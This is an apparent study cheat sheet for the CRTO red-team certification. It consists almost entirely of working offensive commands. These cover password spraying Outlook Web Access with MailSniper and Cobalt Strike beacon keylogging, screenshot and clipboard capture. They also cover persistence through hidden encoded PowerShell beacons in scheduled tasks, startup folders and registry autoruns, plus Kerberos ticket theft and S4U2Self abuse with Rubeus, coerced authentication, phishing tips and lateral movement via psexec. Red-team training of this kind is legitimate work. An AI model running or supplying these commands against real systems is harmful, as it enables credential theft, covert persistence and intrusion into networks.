# CRTO Cheat Sheet



{% embed url="https://swisskyrepo.github.io/InternalAllTheThings/command-control/cobalt-strike/" %}

##

## Initial Compromise

### Generate Username Wordlist

#### namemash.py

<pre><code><strong>$ cat names.txt
</strong><strong>
</strong><strong>Cassy Foxy
</strong><strong>Alice Wondeful
</strong><strong>Joey Washbanger
</strong><strong>
</strong><strong>$ namemash.py names.txt > possible.txt
</strong></code></pre>

### Password Spraying OWA

#### MailSniper

`Invoke-DomainHarvestOWA` -Get NetBIOS name of the target domain with .

```powershell
PS> Invoke-DomainHarvestOWA -ExchHostname <mail.domain.com>
The domain appears to be: DOMAIN or domain.com
```

`Invoke-UsernameHarvestOWA` - Get valid usernames using wordlist.

```powershell
PS> Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -Domain domain.com 
-UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
```

`Invoke-PasswordSprayOWA` - Password spray user list with credential.

<pre class="language-powershell"><code class="lang-powershell"><strong>PS> Invoke-PasswordSprayOWA -ExchHostname mail.domain.com 
</strong>-UserList .\Desktop\valid.txt -Password Password123!
</code></pre>

`Get-GlobalAddressList` - Downloads global address list.

```powershell
PS> Get-GlobalAddressList -ExchHostname mail.domain.com -UserName 
domain.com\cfoxy -Password Password123! -OutFile .\global-addr-list.txt
```

## Host Reconnaissance

### Cobalt Strike

#### Processes

`ps` - List running processes

```sh
beacon> ps
```

#### SeatBelt

[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# tool that automatically enumerates a host

```sh
beacon> execute-assembly C:\Tools\Seatbelt.exe -group=system
```

#### Screenshots

`screenshot` - Takes a single screenshot of users Desktop

```sh
beacon> screenshot
```

`printscreen` - Takes a single screenshot using PrintScr method

```sh
beacon> printscreen
```

`screenwatch` - Takes a periodic screenshot of users Desktop

```sh
beacon> screenwatch
```

#### Keylogger

keylogger - captures user keystrokes, useful for capturing usernames, passwords, or other sensitive information. Can be useful for coercion.

```sh
beacon> keylogger

beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 6    0     keystroke logger

beacon> jobkill 6
```

#### Clipboard

`clipboard` - captures any text from users clipboard. Does not capture images or other data.

```sh
beacon> clipboard
```

#### User Sessions

`net logons` - lists the logon sessions on this machine.

```sh
beacon> net logons
```

##

## Host Persistence

### Task Scheduler

#### SharPersist - schtask

```sh
beacon> execute-assembly C:\Tools\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
-a "-nop -w hidden -enc <b64 encoded CS beacon>" -n "Updater" -m add -o hourly
```

### Startup Folder

#### SharPersist - startupFolder

<pre><code><strong>beacon> execute-assembly C:\Tools\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
</strong><strong>-a "-nop -w hidden -enc &#x3C;b64 encoded CS beacon>" -f "NameOfStartUpFolder" -m add
</strong></code></pre>

### Registry Autorun

#### SharPersist - reg

```
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" 
-a "/q /n" -k "hkcurun" -v "Updater" -m add
```



## Host Privilege Escalation

### Windows Services



## Windows Command Line tools

### Debugging & Helper commands.

#### View error message

```powershell
[-] could not upload file: 32 - ERROR_SHARING_VIOLATION
C:\>net helpmsg 32
The process cannot access the file because it is being used by another process.
```

### Recon & Enumeration (Windows)

#### List named pipes (SMB)

```powershell
PS C:\> ls \\.\pipe\
```

#### tcp connections

```powershell
PS> netstat -anop tcp
```

```powershell
PS> netstat -anop tcp | findstr 1337
```



## Kerberos Tickets

### Extract TGT's from compromised host

#### Rubeus

```sh
beacon> execute-assembly C:\Tools\Rubeus.exe monitor /interval:10 /nowrap
beacon> jobkill
```

### Request NetOnly Kerberos Ticket

#### Rubeus

Below will open a command prompt with the NetOnly ticket. We can then use steal\_token \<PID> and impersonate that user.

```sh
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /
program:C:\Windows\System32\cmd.exe /ticket<user-ticket>
```

## Coerce Host Authentication

If we compromised a host, we can try to force an authentication attempt or phish a user to harvest TGTs.

#### SharpSpoolTriggers

```
beacon> execute-assembly C:\Tools\Rubeus.exe monitor /interval:10 /nowrap
beacon> execute-assembly C:\Tools\SharpSpoolTrigger.exe <target-hostname> <compromised-hostname>
```

#### Phishing

We can use Rubeus monitor and send an email to trick a user into authenticating or clicking on a host. The interaction can be as simple as including `dir \\comromised-host`

### Using Kerberos Tickets to spawn remote shell

#### TGT

```sh
// Rubeus triage, dump or monitor to get a TGT.

beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly 
/program:C:\Windows\System32\cmd.exe /ticket:<remote host users TGT>

beacon> steal_token <PID>

beacon> jump psexec64 <remote host FQDN> smb
```



#### TGS (S4U2Self Trick)

```sh
// Rubeus triage, dump or monitor to get TGT
// Get TGS from TGT

Method 1: Get TGS, create sacrificial login, and steal token.

beacon> execute-assembly C:\Tools\Rubeus.exe s4u /impersonateuser:cfoxy /self 
/altservice:cifs/<host-FQDN> /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe 
/domain:ROTTA /username:cfoxy /password:FakePass /ticket:doIFyD[...]MuaW8=

beacon> steal_token <PID>

beacon> jump psexec64 <remote host FQDN> smb

------------------------------------------------------------------------------------------

Method 2: (Create sacrificial login session first and pass to s4u

beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe 
/domain:ROTTA /username:cfoxy /password:FakePass /ticket:doIFyD[...]MuaW8=

beacon> execute-assembly C:\Tools\Rubeus.exe s4u /impersonateuser:cfoxy /self 
/altservice:cifs/<host-FQDN> /user:dc-2$ /ticket:doIFuj[...]lDLklP /self /ptt

beacon> run klist
beacon> ls \\<remote-host-FQDN>
beacon> jump psexec64 <remote host FQDN> smb
```
